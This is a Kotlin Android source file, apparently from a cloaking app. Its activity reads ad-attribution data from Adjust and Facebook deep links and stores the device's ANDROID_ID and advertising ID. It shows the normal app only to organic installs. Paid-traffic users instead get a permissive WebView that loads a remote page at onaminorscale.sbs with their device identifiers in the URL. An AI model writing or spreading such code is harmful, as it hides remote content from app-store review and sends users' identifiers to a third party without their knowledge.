package com.nightavntrs.test

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustConfig
import com.adjust.sdk.LogLevel
import com.android.installreferrer.api.InstallReferrerClient
import com.facebook.applinks.AppLinkData
import java.io.BufferedReader
import java.io.File
import kotlin.concurrent.timer
import kotlin.properties.Delegates


lateinit var referrerClient: InstallReferrerClient
var bannerUri = ""
var sucess_FB: String by Delegates.observable("") { property, oldValue, newValue -> BannerLoad.successLoad().FBload(CurrentContext)}
var sucess_Adj: String by Delegates.observable("") { property, oldValue, newValue -> BannerLoad.successLoad().B_IDload(CurrentContext,newValue)}
class BannerLoad : AppCompatActivity() {
    @SuppressLint("HardwareIds", "SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_banner_load)
        CurrentContext = this
        //TODO Adjust
        val appToken = "44n4eogju4ao"//Токен ADJUST
        //val environment = AdjustConfig.ENVIRONMENT_SANDBOX
        val environment = AdjustConfig.ENVIRONMENT_PRODUCTION;
        val config = AdjustConfig(this, appToken, environment)
        // Change the log level.
        config.setLogLevel(LogLevel.VERBOSE)
        config.isEventBufferingEnabled = true
        // Set attribution delegate.
        config.setOnAttributionChangedListener { attribution ->
            Log.d("[i]", "Attribution callback called!")
            Log.d("[i]", "Attribution: $attribution")
            //TODO Читаем и записываем пременные #trackerName
            B_ID = attribution.trackerName.toString()
            if(B_ID != "") {
                IO().saveFile(this, "B_ID.cfg", B_ID)
                Log.i("[*B_ID]", B_ID)
                sucess_Adj = B_ID
                if(B_ID != "Organic"){
                    //ModeOK = true
                }
            }
            if(GOOGLE_REF != "") {
                IO().saveFile(this, "GOOGLE_REF.cfg", GOOGLE_REF)
                Log.i("[*GOOGLE_REF]", GOOGLE_REF)
            }
            if(FB_BANNER_ID != "") {
                IO().saveFile(this, "FB_BANNER_ID.cfg", FB_BANNER_ID)
                Log.i("[*FB_BANNER_ID]", FB_BANNER_ID)
                sucess_FB = FB_BANNER_ID
                if(FB_BANNER_ID != ""){
                    //ModeOK = true
                }
            }
            else{
                AppLinkData.fetchDeferredAppLinkData(
                    this
                ) {
                    if (it != null) {
                        FB_BANNER_ID = it.targetUri.toString().replace("app://","")
                        if (FB_BANNER_ID != "")
                        {
                            IO().saveFile(this, "FB_BANNER_ID.cfg", FB_BANNER_ID)
                            Log.i("[*FB_BANNER_ID]", FB_BANNER_ID)
                            sucess_FB = FB_BANNER_ID
                        }
                    }
                }
            }
        }
        // Set event success tracking delegate.
        config.setOnEventTrackingSucceededListener { eventSuccessResponseData ->
            Log.d("[i]", "Event success callback called!")
            Log.d("[i]", "Event success data: $eventSuccessResponseData")
        }
        // Set event failure tracking delegate.
        config.setOnEventTrackingFailedListener { eventFailureResponseData ->
            Log.d("[i]", "Event failure callback called!")
            Log.d("[i]", "Event failure data: $eventFailureResponseData")
        }
        // Set session success tracking delegate.
        config.setOnSessionTrackingSucceededListener { sessionSuccessResponseData ->
            Log.d("[i]", "Session success callback called!")
            Log.d("[i]", "Session success data: $sessionSuccessResponseData")
        }
        // Set session failure tracking delegate.
        config.setOnSessionTrackingFailedListener { sessionFailureResponseData ->
            Log.d("[i]", "Session failure callback called!")
            Log.d("[i]", "Session failure data: $sessionFailureResponseData")
        }
        // Evaluate deferred deep link to be launched.
        config.setOnDeeplinkResponseListener { deeplink ->
            Log.d("[i]", "Deferred deep link callback called!")
            Log.d("[i]", "Deep link URL: $deeplink")
            true
        }
        config.isSendInBackground = true
        //TODO RunAdjust
        Adjust.onCreate(config)
        Adjust.onResume()
//-----------------------------------------------------------------------------------------
        val webView = findViewById<WebView>(R.id.bannerView)
        val webSettings = webView.settings
        webSettings.javaScriptEnabled = true
        webView.settings.javaScriptEnabled = true
        webView.settings.loadWithOverviewMode = true
        webView.settings.useWideViewPort = true
        webView.settings.loadsImagesAutomatically = true
        webView.settings.javaScriptCanOpenWindowsAutomatically = true
        webView.settings.allowContentAccess = true
        webView.settings.databaseEnabled = true
        webView.settings.setSupportZoom(true)
        webView.settings.domStorageEnabled = true
        webView.settings.builtInZoomControls = true
        webView.settings.displayZoomControls = false
        webView.scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
        webView.isScrollbarFadingEnabled = false
        //TODO Set WebView to Client
        object : WebViewClient() {
            @Deprecated("Deprecated in Java")
            override fun shouldOverrideUrlLoading(webView: WebView, url: String): Boolean {
                return false
            }
        }.also { webView.webViewClient = it }
        webView
//-----------------------------------------------------------------------------------------
        //TODO Читаем содержимое файла "B_ID"
        var file = File(filesDir, "B_ID.cfg")
        if (isFileExists(file)) {
            //val encoded = Files.readAllBytes(file.toPath())
            val bufferedReader: BufferedReader = file.bufferedReader()
            val inputString = bufferedReader.use { it.readText() }
            B_ID = inputString
            Log.i("[B_ID]", B_ID)
        }
        else{
            try{
                B_ID = Adjust.getAttribution().trackerName.toString()
            }
            catch (e: NullPointerException)
            {
                Log.i("[B_ID]", "IS NULL")
            }
            if(B_ID != "")
            {
                IO().saveFile(this, "B_ID.cfg", B_ID)
                Log.i("[*B_ID]", B_ID)
            }
        }
        //TODO Читаем содержимое файла "ADID"
        file = File(filesDir, "ADID.cfg")
        if (isFileExists(file)) {
            //val encoded = Files.readAllBytes(file.toPath())
            val bufferedReader: BufferedReader = file.bufferedReader()
            val inputString = bufferedReader.use { it.readText() }
            ADID = inputString
            Log.i("[ADID]", ADID)
        }
        else{
            if(ADID != "")
            {
                IO().saveFile(this, "ADID.cfg", ADID)
                Log.i("[*ADID]", ADID)
            }
            else{
                //TODO getADID from Adjust
                Adjust.getGoogleAdId(applicationContext) { googleAdId ->
                    Log.i("[ADID]", googleAdId)
                    ADID = googleAdId
                }
            }
        }
        //TODO Читаем содержимое файла "FB_BANNER_ID"
        file = File(filesDir, "FB_BANNER_ID.cfg")
        if (isFileExists(file)) {
            //val encoded = Files.readAllBytes(file.toPath())
            val bufferedReader: BufferedReader = file.bufferedReader()
            val inputString = bufferedReader.use { it.readText() }
            FB_BANNER_ID = inputString
            Log.i("[FB_BANNER_ID]", FB_BANNER_ID)
        }
        else{

        }
        //TODO Читаем содержимое файла "UDID"
        file = File(filesDir, "UDID.cfg")
        if (isFileExists(file)) {
            //val encoded = Files.readAllBytes(file.toPath())
            val bufferedReader: BufferedReader = file.bufferedReader()
            val inputString = bufferedReader.use { it.readText() }
            UDID = inputString
            Log.i("[UDID]", UDID)
        }
        else{
            UDID = Settings.Secure.getString(this.contentResolver,
                Settings.Secure.ANDROID_ID)
            IO().saveFile(this, "UDID.cfg", UDID)
            Log.i("[*UDID]", UDID)
        }
        file = File(filesDir, "GOOGLE_REF.cfg")
        if (isFileExists(file)) {
            //val encoded = Files.readAllBytes(file.toPath())
            val bufferedReader: BufferedReader = file.bufferedReader()
            val inputString = bufferedReader.use { it.readText() }
            GOOGLE_REF = inputString
            Log.i("[GOOGLE_REF]", GOOGLE_REF)
        }
//-----------------------------------------------------------------------------------------
       if(isOnline(this) == true){
           if(ADID != "" && UDID != "") {
               if(FB_BANNER_ID != ""){
                   BannerLoader = true
                   bannerUri =
                       "https://onaminorscale.sbs/c/?app_id=13546&gaid=${UDID}&banner_id=${FB_BANNER_ID}&param1=${ADID}"
                   Log.i("[i]", "SYSTEM GOTO: $bannerUri")
                   webView.loadUrl(bannerUri)
               }
               if(B_ID != "" && B_ID != "Organic" && !GOOGLE_REF.contains("utm_source=google-play")){
                   bannerUri =
                       "https://onaminorscale.sbs/c/?app_id=13546&gaid=${UDID}&banner_id=${B_ID}&param1=${ADID}"
                   Log.i("[i]", "SYSTEM GOTO: $bannerUri")
                   webView.loadUrl(bannerUri)
                   BannerLoader = true
               }
               if(FB_BANNER_ID == "" && (B_ID == "Organic"||B_ID == "")){
                   BannerLoader = false
                   startActivity(
                       Intent(applicationContext, MainActivity::class.java)
                   )
               }
           }
           else{
               startActivity(
                   Intent(applicationContext, BannerLoad::class.java)
               )
           }
       }else
       {
           val i: Intent = Intent(this, noConnection::class.java)
           startActivity(i)
       }

    }
    private fun isFileExists(file: File): Boolean {
        return file.exists() && !file.isDirectory
    }
    //ADJUST CallBack
    companion object {
        @JvmField
        var FB_BANNER_ID: String = ""
        @JvmField
        var ADID: String = ""
        @JvmField
        var UDID: String = ""
        @JvmField
        var B_ID: String = ""
        @JvmField
        var GOOGLE_REF: String = ""
    }
    @Override
    override fun onBackPressed() {
        val webView = findViewById<WebView>(R.id.bannerView)
        if (!webView.canGoBack()) {
            val builder = AlertDialog.Builder(this)
            builder.setTitle("Really Exit?")
            builder.setMessage("Do you want to close the application?")
//builder.setPositiveButton("OK", DialogInterface.OnClickListener(function = x))
            builder.setPositiveButton(android.R.string.yes) { dialog, which ->
                finishAffinity()
            }
            builder.setNegativeButton(android.R.string.no) { dialog, which ->

            }
            builder.show()
        } else {
            webView.goBack()
        }
    }
    class successLoad {
        fun FBload(context: Context)
        {
            //ModeOK = true
            var counter = 0
            val i: Intent = Intent(context, BannerLoad::class.java)
            timer(initialDelay = 1000L, period = 1000L) {
                counter += 1
                if(counter == 3){
                    context.startActivity(i)
                    Log.i("[FB_BANNER_ID]", "ROUTED")
                }
            }

        }
        fun B_IDload(context: Context,value: String)
        {
            var counter: Int = 0
            val i: Intent = Intent(context, BannerLoad::class.java)
            if(value != "Organic" && value != "")
                timer(initialDelay = 1000L, period = 1000L) {
                counter += 1
                if(counter == 3){
                    context.startActivity(i)
                    Log.i("[B_ID]", "ROUTED")
                }
            }
            Log.i("[B_ID]", "Value: $value")
        }
    }
    private fun isOnline(context: Context): Boolean {
        val cm = context.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val netInfo = cm.activeNetworkInfo
        return netInfo != null && netInfo.isConnectedOrConnecting
    }
    override fun onDestroy() {
        Adjust.onPause()
        super.onDestroy()
    }
    class MyWebViewClient : WebViewClient() {
        override fun onPageFinished(view: WebView, url: String) {
            CookieManager.getInstance().flush()
        }
    }
}